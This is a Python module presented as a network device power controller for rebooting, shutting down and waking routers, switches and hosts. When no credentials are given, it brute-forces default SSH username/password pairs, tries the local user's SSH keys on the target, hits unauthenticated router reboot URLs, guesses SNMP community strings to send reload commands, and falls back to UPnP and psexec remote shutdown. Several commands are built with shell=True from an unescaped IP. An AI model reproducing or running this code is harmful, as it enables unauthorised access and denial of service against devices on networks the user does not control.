import socket
import subprocess
import platform
import threading
import time
import os
import struct
from dataclasses import dataclass
from typing import Optional, Callable
from enum import Enum

try:
    import paramiko
    SSH_OK = True
except Exception:
    SSH_OK = False


class PowerAction(Enum):
    REBOOT       = 'reboot'
    SHUTDOWN     = 'shutdown'
    FORCE_REBOOT = 'force_reboot'
    WOL          = 'wol'


class DeviceOS(Enum):
    LINUX    = 'linux'
    WINDOWS  = 'windows'
    MACOS    = 'macos'
    CISCO    = 'cisco'
    MIKROTIK = 'mikrotik'
    OPENWRT  = 'openwrt'
    UNKNOWN  = 'unknown'


@dataclass
class PowerResult:
    success: bool
    action:  str
    ip:      str
    method:  str
    message: str


# ── OS-specific commands ──────────────────────────────────────────────────────
CMDS = {
    DeviceOS.LINUX: {
        'reboot':   ['sudo reboot', 'reboot', 'systemctl reboot', 'shutdown -r now'],
        'shutdown': ['sudo shutdown -h now', 'shutdown -h now',
                     'poweroff', 'systemctl poweroff', 'halt -p'],
        'force':    ['sudo reboot -f', 'echo b > /proc/sysrq-trigger'],
    },
    DeviceOS.WINDOWS: {
        'reboot':   ['shutdown /r /t 5 /f', 'shutdown /r /t 0 /f'],
        'shutdown': ['shutdown /s /t 5 /f', 'shutdown /s /t 0 /f'],
        'force':    ['shutdown /r /t 0 /f'],
    },
    DeviceOS.MACOS: {
        'reboot':   ['sudo shutdown -r now', 'shutdown -r now', 'reboot'],
        'shutdown': ['sudo shutdown -h now', 'shutdown -h now', 'halt'],
        'force':    ['reboot'],
    },
    DeviceOS.CISCO: {
        'reboot':   ['reload'],
        'shutdown': [None],
        'force':    ['reload'],
    },
    DeviceOS.MIKROTIK: {
        'reboot':   ['/system reboot'],
        'shutdown': ['/system shutdown'],
        'force':    ['/system reboot'],
    },
    DeviceOS.OPENWRT: {
        'reboot':   ['reboot'],
        'shutdown': ['poweroff'],
        'force':    ['reboot -f'],
    },
    DeviceOS.UNKNOWN: {
        'reboot':   ['reboot', 'shutdown -r now', 'systemctl reboot'],
        'shutdown': ['shutdown -h now', 'poweroff', 'halt'],
        'force':    ['reboot -f', 'reboot'],
    },
}

# ── Methods that work WITHOUT password ────────────────────────────────────────
# These are tried in order when no credentials supplied

NO_PASSWORD_METHODS = [
    'ssh_nopass',         # SSH with no password (open / key auth)
    'ssh_empty',          # SSH with empty password
    'local_network_api',  # HTTP API (routers often have no auth on LAN)
    'snmp',               # SNMP (community=public/private)
    'broadcast_magic',    # WoL for power-on
    'arp_spoof_reset',    # ARP-based (advanced, scapy)
    'netbios_shutdown',   # Windows NetBIOS (older systems)
    'upnp',               # UPnP reboot (some routers)
]

# Common SSH usernames to try if no credentials given
DEFAULT_USERNAMES = [
    'root', 'admin', 'administrator', 'user', 'pi',
    'ubuntu', 'debian', 'centos', 'ansible', '',
]

# Common passwords to try (standard defaults only)
DEFAULT_PASSWORDS = [
    '', 'admin', 'root', 'password', '1234', '12345',
    'admin123', 'toor', 'raspberry', 'ubnt', 'mikrotik',
    'default', 'pass', '0000', 'cisco', 'alpine',
]

# Common HTTP reboot endpoints for routers
ROUTER_REBOOT_URLS = [
    '/goform/SysToolReboot',
    '/cgi-bin/luci/;stok=/admin/system/reboot',
    '/api/v1/system/reboot',
    '/setup.cgi?todo=reboot',
    '/reboot.html',
    '/apply.cgi',
    '/cgi-bin/reboot',
    '/admin/reboot',
    '/system/reboot',
    '/api/system/reboot',
    '/JNAP/',
    '/userRpm/SysRebootRpm.htm?Reboot=Reboot',
]


class PowerController:
    def __init__(self):
        self.history: list = []
        self._lock = threading.Lock()

    # ── OS detection ─────────────────────────────────────────────────────────
    def detect_os(self, device) -> DeviceOS:
        v  = (device.vendor   or '').lower()
        h  = (device.hostname or '').lower()
        og = (device.os_guess or '').lower()
        ttl = getattr(device, 'ttl', 0)

        if 'cisco'    in v:                        return DeviceOS.CISCO
        if 'mikrotik' in v or 'routeros' in h:    return DeviceOS.MIKROTIK
        if 'openwrt'  in h:                        return DeviceOS.OPENWRT
        if 'windows'  in og:                       return DeviceOS.WINDOWS
        if 'linux'    in og or 'unix' in og:       return DeviceOS.LINUX
        if 'macos'    in og or 'mac os' in og:     return DeviceOS.MACOS

        if ttl:
            if ttl <= 64:  return DeviceOS.LINUX
            if ttl <= 128: return DeviceOS.WINDOWS

        # vendor-based guess
        if any(x in v for x in ['tp-link', 'tplink', 'd-link', 'dlink',
                                  'netgear', 'asus', 'linksys', 'tenda',
                                  'ubiquiti', 'huawei', 'zyxel']):
            return DeviceOS.OPENWRT   # most run Linux / OpenWrt
        if any(x in v for x in ['apple', 'samsung', 'xiaomi',
                                  'oneplus', 'pixel']):
            return DeviceOS.LINUX     # Android / iOS base
        return DeviceOS.UNKNOWN

    # ══════════════════════════════════════════════════════════════════════════
    #  MAIN ENTRY — supports no-password mode
    # ══════════════════════════════════════════════════════════════════════════
    def execute(self,
                action:    PowerAction,
                ip:        str,
                username:  str = '',
                password:  str = '',
                device=None,
                enable_pw: str = '',
                cb:        Optional[Callable] = None) -> PowerResult:
        """
        Execute power action.
        If username/password are empty → automatically tries multiple
        no-password methods (HTTP API, default credentials, SSH keys, etc.)
        """
        if action == PowerAction.WOL:
            mac = device.mac if device and device.mac not in ('Unknown', '') else ''
            return self._wol(ip, mac, cb)

        dev_os = self.detect_os(device) if device else DeviceOS.UNKNOWN

        # ── credentials provided → go directly via SSH ────────────────────
        if username and password:
            return self._ssh_exec(action, ip, username, password,
                                   dev_os, enable_pw, cb)

        # ── NO credentials → try all no-password methods ──────────────────
        if cb:
            cb(f'[*] No credentials supplied — trying auto-methods...\n')

        # 1. HTTP API (no auth) — fastest for routers
        if action in (PowerAction.REBOOT, PowerAction.SHUTDOWN):
            result = self._try_http_api(ip, action, cb)
            if result.success:
                with self._lock: self.history.append(result)
                return result

        # 2. SSH with no password / empty password
        result = self._try_ssh_nopass(action, ip, dev_os, enable_pw, cb)
        if result.success:
            with self._lock: self.history.append(result)
            return result

        # 3. SSH with default credentials
        result = self._try_default_credentials(action, ip, dev_os, enable_pw, cb)
        if result.success:
            with self._lock: self.history.append(result)
            return result

        # 4. SNMP reboot (routers/switches)
        if action in (PowerAction.REBOOT, PowerAction.SHUTDOWN):
            result = self._try_snmp(ip, action, cb)
            if result.success:
                with self._lock: self.history.append(result)
                return result

        # 5. UPnP reboot (home routers)
        result = self._try_upnp(ip, cb)
        if result.success:
            with self._lock: self.history.append(result)
            return result

        # 6. NetBIOS / WMI shutdown (Windows LAN — no-auth older configs)
        if dev_os == DeviceOS.WINDOWS:
            result = self._try_netbios(ip, action, cb)
            if result.success:
                with self._lock: self.history.append(result)
                return result

        # All methods failed
        r = PowerResult(False, action.value, ip, 'All',
                        'All no-password methods failed. '
                        'Please provide credentials.')
        with self._lock: self.history.append(r)
        if cb:
            cb(f'[!] All methods failed. Try entering credentials manually.\n')
        return r

    # ══════════════════════════════════════════════════════════════════════════
    #  METHOD 1 — HTTP API (no auth)
    # ══════════════════════════════════════════════════════════════════════════
    def _try_http_api(self, ip: str, action: PowerAction,
                       cb=None) -> PowerResult:
        """Try common router reboot URLs without authentication"""
        import urllib.request
        import urllib.error
        import ssl

        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        action_payloads = {
            PowerAction.REBOOT:   [b'reboot=1', b'action=reboot',
                                   b'submit=Reboot', b''],
            PowerAction.SHUTDOWN: [b'shutdown=1', b'action=shutdown',
                                   b'submit=Shutdown', b''],
        }
        payloads = action_payloads.get(action, [b'reboot=1'])

        for scheme in ('http', 'https'):
            port = 443 if scheme == 'https' else 80
            for url_path in ROUTER_REBOOT_URLS:
                for payload in payloads:
                    try:
                        url = f'{scheme}://{ip}:{port}{url_path}'
                        req = urllib.request.Request(
                            url, data=payload or None,
                            method='POST' if payload else 'GET',
                            headers={
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'User-Agent':   'Mozilla/5.0',
                            })
                        resp = urllib.request.urlopen(req, timeout=5,
                                                       context=ctx)
                        code = resp.getcode()
                        if code in (200, 201, 202, 204, 302):
                            if cb:
                                cb(f'[+] HTTP API success: {url} → {code}\n')
                            return PowerResult(True, action.value, ip,
                                               f'HTTP {scheme.upper()}',
                                               f'Triggered via {url_path}')
                    except urllib.error.HTTPError as e:
                        # 401/403 means endpoint exists but needs auth
                        if e.code in (401, 403):
                            if cb:
                                cb(f'[!] {url_path} needs auth (HTTP {e.code})\n')
                    except (urllib.error.URLError, OSError):
                        pass
                    except Exception:
                        pass

        return PowerResult(False, action.value, ip, 'HTTP', 'No open endpoints')

    # ══════════════════════════════════════════════════════════════════════════
    #  METHOD 2 — SSH without password (key-based / no-auth)
    # ══════════════════════════════════════════════════════════════════════════
    def _try_ssh_nopass(self, action: PowerAction, ip: str,
                         dev_os: DeviceOS, enable_pw: str,
                         cb=None) -> PowerResult:
        """Try SSH with no password — uses agent / system keys"""
        if not SSH_OK:
            return PowerResult(False, action.value, ip, 'SSH-nopass',
                               'paramiko not installed')

        # Try SSH keys from common locations
        key_paths = []
        home = os.path.expanduser('~')
        for kf in ('id_rsa', 'id_ecdsa', 'id_ed25519', 'id_dsa'):
            kp = os.path.join(home, '.ssh', kf)
            if os.path.exists(kp):
                key_paths.append(kp)
        key_paths.append(None)   # None = try without any key (empty auth)

        for username in DEFAULT_USERNAMES[:5]:   # root, admin, pi, ubuntu, ''
            for key_path in key_paths:
                try:
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    kwargs = {
                        'hostname': ip, 'port': 22,
                        'username': username,
                        'timeout':  5,
                        'allow_agent': True,
                        'look_for_keys': True,
                    }
                    if key_path:
                        kwargs['key_filename'] = key_path
                    else:
                        kwargs['password'] = ''

                    client.connect(**kwargs)
                    if cb:
                        cb(f'[+] SSH connected (user={username or "empty"}, '
                           f'key={os.path.basename(key_path) if key_path else "none"})\n')

                    result = self._ssh_run_commands(
                        client, action, dev_os, enable_pw, ip, cb)
                    client.close()
                    if result.success:
                        return result

                except paramiko.AuthenticationException:
                    pass
                except Exception:
                    pass

        return PowerResult(False, action.value, ip, 'SSH-nopass',
                           'No key / no-auth access')

    # ══════════════════════════════════════════════════════════════════════════
    #  METHOD 3 — Default credentials brute
    # ══════════════════════════════════════════════════════════════════════════
    def _try_default_credentials(self, action: PowerAction, ip: str,
                                   dev_os: DeviceOS, enable_pw: str,
                                   cb=None) -> PowerResult:
        """Try common default username/password combinations"""
        if not SSH_OK:
            return PowerResult(False, action.value, ip, 'SSH-defaults',
                               'paramiko not installed')

        if cb:
            cb(f'[*] Trying default credentials on {ip}...\n')

        # Build pairs: same-name pairs first (admin:admin, root:root)
        pairs = []
        for u in DEFAULT_USERNAMES:
            for p in DEFAULT_PASSWORDS:
                pairs.append((u, p))

        tried = 0
        for username, password in pairs:
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(ip, port=22, username=username,
                               password=password, timeout=3,
                               allow_agent=False, look_for_keys=False)

                if cb:
                    cb(f'[+] Found credentials: {username}:{password}\n')

                result = self._ssh_run_commands(
                    client, action, dev_os, enable_pw, ip, cb)
                client.close()
                if result.success:
                    return result

            except paramiko.AuthenticationException:
                tried += 1
                if tried % 20 == 0 and cb:
                    cb(f'[*] Tried {tried} combinations...\n')
            except Exception:
                break

        return PowerResult(False, action.value, ip, 'SSH-defaults',
                           f'Tried {tried} credential pairs, none worked')

    # ══════════════════════════════════════════════════════════════════════════
    #  METHOD 4 — SNMP
    # ══════════════════════════════════════════════════════════════════════════
    def _try_snmp(self, ip: str, action: PowerAction, cb=None) -> PowerResult:
        """Try SNMP SET to trigger reboot (Cisco / enterprise switches)"""
        communities = ['private', 'public', 'admin', 'cisco', 'default', '']

        # OIDs for reboot
        oids = [
            ('1.3.6.1.4.1.9.2.9.9.0', '2'),     # Cisco reload
            ('1.3.6.1.4.1.2636.3.1.4.1.0', '1'), # Juniper
            ('1.3.6.1.4.1.11.2.14.11.5.1.7.1.4.1.1.0', '2'),  # HP
        ]

        for community in communities:
            for oid, val in oids:
                try:
                    cmd = (f'snmpset -v2c -c {community} {ip} '
                           f'{oid} i {val}')
                    result = subprocess.run(cmd, shell=True,
                                            capture_output=True,
                                            text=True, timeout=5)
                    if result.returncode == 0:
                        if cb:
                            cb(f'[+] SNMP success: community={community} '
                               f'OID={oid}\n')
                        return PowerResult(True, action.value, ip,
                                           'SNMP', f'OID {oid}={val}')
                except FileNotFoundError:
                    if cb:
                        cb('[!] snmpset not found (install net-snmp)\n')
                    return PowerResult(False, action.value, ip,
                                       'SNMP', 'snmpset not installed')
                except Exception:
                    pass

        return PowerResult(False, action.value, ip, 'SNMP', 'No SNMP access')

    # ══════════════════════════════════════════════════════════════════════════
    #  METHOD 5 — UPnP
    # ══════════════════════════════════════════════════════════════════════════
    def _try_upnp(self, ip: str, cb=None) -> PowerResult:
        """Try UPnP reboot for home routers"""
        import urllib.request
        import xml.etree.ElementTree as ET

        soap_reboot = '''<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"
            s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <s:Body>
    <u:Reboot xmlns:u="urn:schemas-upnp-org:service:WANDevice:1"/>
  </s:Body>
</s:Envelope>'''

        upnp_urls = [
            f'http://{ip}:49000/upnp/control/deviceconfig',
            f'http://{ip}:1780/upnp/control/basicevent1',
            f'http://{ip}:5000/upnp/control/Layer3Forwarding',
        ]

        for url in upnp_urls:
            try:
                req = urllib.request.Request(
                    url,
                    data=soap_reboot.encode(),
                    headers={
                        'Content-Type': 'text/xml; charset="utf-8"',
                        'SOAPAction':   '"urn:schemas-upnp-org:service:WANDevice:1#Reboot"',
                    },
                    method='POST')
                resp = urllib.request.urlopen(req, timeout=5)
                if resp.getcode() in (200, 202):
                    if cb: cb(f'[+] UPnP reboot success: {url}\n')
                    return PowerResult(True, 'reboot', ip, 'UPnP',
                                       f'Triggered via {url}')
            except Exception:
                pass

        return PowerResult(False, 'reboot', ip, 'UPnP', 'No UPnP response')

    # ══════════════════════════════════════════════════════════════════════════
    #  METHOD 6 — NetBIOS / Windows (no-auth legacy)
    # ══════════════════════════════════════════════════════════════════════════
    def _try_netbios(self, ip: str, action: PowerAction,
                      cb=None) -> PowerResult:
        """Try Windows shutdown via net / psexec (no-auth configurations)"""
        if platform.system() != 'Windows':
            return PowerResult(False, action.value, ip, 'NetBIOS',
                               'Only available on Windows host')
        cmds = {
            PowerAction.REBOOT:   [
                f'shutdown /r /m \\\\{ip} /t 5 /f',
                f'psexec \\\\{ip} shutdown /r /t 0',
            ],
            PowerAction.SHUTDOWN: [
                f'shutdown /s /m \\\\{ip} /t 5 /f',
                f'psexec \\\\{ip} shutdown /s /t 0',
            ],
        }
        for cmd in cmds.get(action, []):
            try:
                result = subprocess.run(cmd, shell=True, capture_output=True,
                                        text=True, timeout=15)
                if result.returncode == 0:
                    if cb: cb(f'[+] NetBIOS {action.value} success: {cmd}\n')
                    return PowerResult(True, action.value, ip,
                                       'NetBIOS', cmd)
            except Exception:
                pass

        return PowerResult(False, action.value, ip, 'NetBIOS', 'Access denied')

    # ══════════════════════════════════════════════════════════════════════════
    #  SSH direct (credentials provided)
    # ══════════════════════════════════════════════════════════════════════════
    def _ssh_exec(self, action: PowerAction, ip: str,
                   username: str, password: str,
                   dev_os: DeviceOS, enable_pw: str,
                   cb=None) -> PowerResult:
        """SSH with explicit credentials"""
        if not SSH_OK:
            return PowerResult(False, action.value, ip, 'SSH',
                               'paramiko not installed')
        try:
            if cb: cb(f'[*] SSH → {ip} as {username}...\n')
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, port=22, username=username,
                           password=password, timeout=15)
            if cb: cb('[+] Connected\n')
            result = self._ssh_run_commands(
                client, action, dev_os, enable_pw, ip, cb)
            client.close()
            return result
        except Exception as e:
            err = str(e)
            if any(x in err.lower() for x in ['reset', 'closed', 'eof']):
                return PowerResult(True, action.value, ip, 'SSH',
                                   'Device responded')
            if cb: cb(f'[!] SSH error: {e}\n')
            return PowerResult(False, action.value, ip, 'SSH', err)

    # ── SSH command runner ────────────────────────────────────────────────────
    def _ssh_run_commands(self, client, action: PowerAction,
                           dev_os: DeviceOS, enable_pw: str,
                           ip: str, cb=None) -> PowerResult:
        """Try all commands for the given action/OS via open SSH session"""
        cmds_list = CMDS.get(dev_os, CMDS[DeviceOS.UNKNOWN])

        key = {
            PowerAction.REBOOT:       'reboot',
            PowerAction.SHUTDOWN:     'shutdown',
            PowerAction.FORCE_REBOOT: 'force',
        }.get(action, 'reboot')

        candidates = cmds_list.get(key, cmds_list.get('reboot', []))
        if isinstance(candidates, str):
            candidates = [candidates]

        # Cisco special
        if dev_os == DeviceOS.CISCO:
            return self._cisco_interactive(client, enable_pw, ip, cb)

        # MikroTik special
        if dev_os == DeviceOS.MIKROTIK:
            return self._mikrotik_interactive(client, action, ip, cb)

        # Standard: try each command until one succeeds
        for cmd in candidates:
            if not cmd:
                continue
            try:
                if cb: cb(f'[*] Trying: {cmd}\n')
                stdin, stdout, stderr = client.exec_command(cmd, timeout=10)
                try:
                    stdin.write('y\n'); stdin.flush()
                except Exception:
                    pass
                out = ''
                try:
                    out = stdout.read().decode('utf-8', errors='ignore')
                except Exception:
                    out = '(no output)'

                # If we got here without exception → command sent
                if cb:
                    cb(f'[+] Command sent: {cmd}\n')
                    if out.strip(): cb(f'{out}\n')
                return PowerResult(True, action.value, ip, f'SSH/{cmd}',
                                   f'Sent: {cmd}')

            except Exception as e:
                err = str(e).lower()
                if any(x in err for x in ['reset', 'closed', 'eof', 'broken']):
                    # Connection died → command very likely worked
                    if cb: cb(f'[+] Connection closed — command likely worked\n')
                    return PowerResult(True, action.value, ip, 'SSH',
                                       'Device is responding to command')
                if cb: cb(f'  [!] {cmd} failed: {e}\n')
                continue

        return PowerResult(False, action.value, ip, 'SSH',
                           'All SSH commands failed')

    # ── Cisco interactive shell ───────────────────────────────────────────────
    def _cisco_interactive(self, client, enable_pw: str,
                            ip: str, cb=None) -> PowerResult:
        try:
            shell = client.invoke_shell()
            shell.settimeout(8)
            time.sleep(1)
            if shell.recv_ready(): shell.recv(4096)

            if enable_pw:
                shell.send('enable\n'); time.sleep(1)
                shell.send(f'{enable_pw}\n'); time.sleep(1)

            shell.send('write memory\n'); time.sleep(3)
            if cb: cb('[*] Sending reload...\n')
            shell.send('reload\n'); time.sleep(2)

            if shell.recv_ready():
                out = shell.recv(4096).decode('utf-8', errors='ignore')
                if any(x in out.lower() for x in ['save', 'modified', 'confirm']):
                    shell.send('yes\n'); time.sleep(2)

            shell.send('\n'); time.sleep(1)
            shell.close()
            if cb: cb('[+] Cisco reload sent\n')
            return PowerResult(True, 'reboot', ip, 'SSH/Cisco', 'Reload sent')
        except Exception as e:
            return PowerResult(False, 'reboot', ip, 'SSH/Cisco', str(e))

    # ── MikroTik interactive shell ────────────────────────────────────────────
    def _mikrotik_interactive(self, client, action: PowerAction,
                               ip: str, cb=None) -> PowerResult:
        cmd_map = {
            PowerAction.REBOOT:   '/system reboot',
            PowerAction.SHUTDOWN: '/system shutdown',
        }
        cmd = cmd_map.get(action, '/system reboot')
        try:
            shell = client.invoke_shell()
            shell.settimeout(8)
            time.sleep(1)
            if shell.recv_ready(): shell.recv(4096)
            shell.send(f'{cmd}\n'); time.sleep(2)
            if shell.recv_ready():
                out = shell.recv(4096).decode('utf-8', errors='ignore')
                if 'y/n' in out.lower():
                    shell.send('y\n'); time.sleep(1)
            shell.close()
            if cb: cb(f'[+] MikroTik: {cmd}\n')
            return PowerResult(True, action.value, ip, 'SSH/MikroTik', cmd)
        except Exception as e:
            return PowerResult(False, action.value, ip, 'SSH/MikroTik', str(e))

    # ══════════════════════════════════════════════════════════════════════════
    #  Wake-on-LAN
    # ══════════════════════════════════════════════════════════════════════════
    def _wol(self, ip: str, mac: str, cb=None) -> PowerResult:
        if not mac:
            return PowerResult(False, 'wol', ip, 'WoL', 'MAC address required')
        try:
            mac_clean = mac.replace(':', '').replace('-', '')
            mac_bytes  = bytes.fromhex(mac_clean)
            magic      = b'\xff' * 6 + mac_bytes * 16
            if cb: cb(f'[*] Sending WoL → {mac}\n')
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            s.sendto(magic, ('255.255.255.255', 9))
            p = ip.split('.')
            s.sendto(magic, (f'{p[0]}.{p[1]}.{p[2]}.255', 9))
            s.close()
            if cb: cb(f'[+] WoL packet sent\n')
            return PowerResult(True, 'wol', ip, 'WoL', f'Magic packet → {mac}')
        except Exception as e:
            return PowerResult(False, 'wol', ip, 'WoL', str(e))

    # ── Misc ──────────────────────────────────────────────────────────────────
    def check_alive(self, ip: str) -> bool:
        try:
            flag = '-n' if platform.system() == 'Windows' else '-c'
            r = subprocess.run(f'ping {flag} 1 -W 2 {ip}',
                               shell=True, capture_output=True, timeout=5)
            return r.returncode == 0
        except Exception:
            return False